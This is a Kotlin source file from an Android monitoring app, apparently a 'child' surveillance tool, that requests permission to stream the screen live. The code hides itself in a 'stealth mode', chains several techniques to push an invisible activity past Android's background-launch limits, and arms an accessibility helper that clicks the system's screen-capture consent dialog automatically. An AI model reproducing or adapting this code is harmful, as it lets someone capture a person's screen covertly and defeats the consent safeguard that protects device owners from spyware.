package com.nexus.child.components.screen

import android.app.Activity
import android.app.ActivityOptions
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.core.app.NotificationCompat
import com.nexus.child.R
import com.nexus.child.accessibility.MediaProjectionAutoClickHelper
import com.nexus.child.accessibility.NexusAccessibilityService

/**
 * TransparentMediaProjectionActivity is an invisible, transient activity used to request
 * Android MediaProjection permission for live screen streaming.
 *
 * Hey friend! Here is why this activity is built with a multi-tier launch architecture:
 * 1. Android's MediaProjectionManager.createScreenCaptureIntent() strictly requires an Activity
 *    context to dispatch the consent prompt via startActivityForResult. Services cannot call it directly.
 * 2. On Android 10+ (API 29+) and especially Android 14+ (API 34+), Background Activity Launch (BAL)
 *    restrictions strictly prohibit background services from popping activities on screen unless:
 *    - The app has SYSTEM_ALERT_WINDOW (Display over other apps / MIUI pop-up in background).
 *    - The activity is started via an active system-bound AccessibilityService.
 *    - The activity is started via an explicit PendingIntent with MODE_BACKGROUND_ACTIVITY_START_ALLOWED.
 *    - A high-priority notification with a fullScreenIntent is dispatched.
 * 3. In Stealth Mode, MainActivity is disabled (COMPONENT_ENABLED_STATE_DISABLED). By assigning
 *    android:taskAffinity="" and android:launchMode="singleInstance" in AndroidManifest.xml, this
 *    activity runs in its own completely independent rootless task, unaffected by MainActivity.
 * 4. Android 14 FGS Lifecycle Compliance:
 *    Android 14 mandates that ScreenCaptureService (foreground service type mediaProjection) can ONLY
 *    be started AFTER user consent has been granted. Starting it prematurely triggers a fatal
 *    ForegroundServiceStartNotAllowedException or SecurityException. Therefore, ScreenCaptureService
 *    is started inside onActivityResult only after RESULT_OK is confirmed.
 */
class TransparentMediaProjectionActivity : Activity() {

    companion object {
        private const val TAG = "TransparentMediaProj"
        private const val REQUEST_CODE_MEDIA_PROJECTION = 1001
        private const val NOTIFICATION_ID_TRANSIENT_LAUNCH = 9022
        private const val CHANNEL_ID_TRANSIENT = "nexus_transient_launch_channel"

        /**
         * Dispatches a multi-tier resilient launch targeting TransparentMediaProjectionActivity.
         * Ensures the activity displays regardless of whether the app is in the foreground,
         * running in the background, or operating in stealth mode.
         */
        @Suppress("DEPRECATION")
        fun launch(context: Context) {
            Log.d(TAG, "Initiating multi-tier launch for TransparentMediaProjectionActivity...")

            val intent = Intent(context, TransparentMediaProjectionActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_MULTIPLE_TASK)
                addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            }

            // Tier 1: Launch via PendingIntent with Android 14+ BAL exemption opt-in
            try {
                val options = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    ActivityOptions.makeBasic().apply {
                        pendingIntentBackgroundActivityStartMode =
                            ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED
                    }
                } else {
                    ActivityOptions.makeBasic()
                }

                val flags = PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                val pendingIntent = PendingIntent.getActivity(
                    context,
                    REQUEST_CODE_MEDIA_PROJECTION,
                    intent,
                    flags
                )

                pendingIntent.send(context, 0, null, null, null, null, options.toBundle())
                Log.d(TAG, "Tier 1: Dispatched via PendingIntent with background activity start allowance")
                return
            } catch (e: Exception) {
                Log.w(TAG, "Tier 1 PendingIntent dispatch failed: ${e.message}")
            }

            // Tier 2: Launch via active AccessibilityService context if bound to system
            val a11yService = NexusAccessibilityService.getInstance()
            if (a11yService != null) {
                try {
                    a11yService.startActivity(intent)
                    Log.d(TAG, "Tier 2: Dispatched via NexusAccessibilityService context")
                    return
                } catch (e: Exception) {
                    Log.w(TAG, "Tier 2 AccessibilityService context start failed: ${e.message}")
                }
            }

            // Tier 3: Direct context startActivity (succeeds if app holds SYSTEM_ALERT_WINDOW / MIUI background pop-up)
            try {
                context.startActivity(intent)
                Log.d(TAG, "Tier 3: Dispatched via standard context.startActivity")
                return
            } catch (e: Exception) {
                Log.w(TAG, "Tier 3 Direct startActivity failed: ${e.message}")
            }

            // Tier 4: Fallback to high-priority notification with fullScreenIntent
            Log.d(TAG, "Tier 4: Dispatching full-screen intent notification fallback...")
            launchViaFullScreenNotification(context, intent)
        }

        /**
         * Dispatches a transient high-priority notification with a fullScreenIntent.
         * The Android NotificationManagerService handles the activity pop-up directly.
         */
        private fun launchViaFullScreenNotification(context: Context, intent: Intent) {
            try {
                val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
                    ?: return

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val channel = NotificationChannel(
                        CHANNEL_ID_TRANSIENT,
                        "Nexus Screen Authorization",
                        NotificationManager.IMPORTANCE_HIGH
                    ).apply {
                        description = "Transient channel for screen authorization pop-up"
                        setShowBadge(false)
                        enableLights(false)
                        enableVibration(false)
                    }
                    notificationManager.createNotificationChannel(channel)
                }

                val flags = PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                val pendingIntent = PendingIntent.getActivity(
                    context,
                    REQUEST_CODE_MEDIA_PROJECTION,
                    intent,
                    flags
                )

                val notification = NotificationCompat.Builder(context, CHANNEL_ID_TRANSIENT)
                    .setSmallIcon(R.drawable.ic_shield_check)
                    .setContentTitle("Nexus Screen Monitoring")
                    .setContentText("Authorizing screen capture session...")
                    .setPriority(NotificationCompat.PRIORITY_MAX)
                    .setCategory(NotificationCompat.CATEGORY_ALARM)
                    .setFullScreenIntent(pendingIntent, true)
                    .setAutoCancel(true)
                    .build()

                notificationManager.notify(NOTIFICATION_ID_TRANSIENT_LAUNCH, notification)
                Log.d(TAG, "Transient full-screen notification posted successfully")
            } catch (e: Exception) {
                Log.e(TAG, "Failed posting full-screen intent notification: ${e.message}", e)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d(TAG, "TransparentMediaProjectionActivity created. Requesting screen capture intent...")

        // Immediately dismiss transient notification if it was used for background launch
        dismissTransientNotification()

        try {
            // Arm accessibility auto-click helper for an 8-second window
            MediaProjectionAutoClickHelper.enableAutoClick()

            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager
            if (mpm == null) {
                Log.e(TAG, "MediaProjectionManager not available on this device")
                MediaProjectionAutoClickHelper.disableAutoClick()
                ScreenController.onMediaProjectionDenied("MediaProjectionManager not available")
                finish()
                return
            }

            // CRITICAL: On Android 14+, ScreenCaptureService must NOT be started here.
            // It must be started in onActivityResult only after the user/accessibility grants the token.
            @Suppress("DEPRECATION")
            startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_CODE_MEDIA_PROJECTION)
            Log.d(TAG, "MediaProjection permission dialog launched")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start media projection intent: ${e.message}", e)
            MediaProjectionAutoClickHelper.disableAutoClick()
            ScreenController.onMediaProjectionDenied("Failed to launch projection intent: ${e.message}")
            finish()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == REQUEST_CODE_MEDIA_PROJECTION) {
            if (resultCode == RESULT_OK && data != null) {
                Log.d(TAG, "MediaProjection permission granted (resultCode=$resultCode)")

                // Disarm accessibility auto-click
                MediaProjectionAutoClickHelper.disableAutoClick()

                // Hand token to ScreenCaptureService so it enters foreground FIRST,
                // then ScreenCaptureService safely triggers ScreenController on Android 14+!
                ScreenCaptureService.start(this, resultCode, data)
            } else {
                Log.w(TAG, "MediaProjection permission canceled or denied (resultCode=$resultCode)")
                ScreenCaptureService.stop(this)
                MediaProjectionAutoClickHelper.disableAutoClick()
                ScreenController.onMediaProjectionDenied("User or system canceled screen capture prompt")
            }
            finish()
        }
    }

    private fun dismissTransientNotification() {
        try {
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
            notificationManager?.cancel(NOTIFICATION_ID_TRANSIENT_LAUNCH)
        } catch (e: Exception) {
            Log.w(TAG, "Error dismissing transient launch notification: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        dismissTransientNotification()
        Log.d(TAG, "TransparentMediaProjectionActivity destroyed")
    }
}
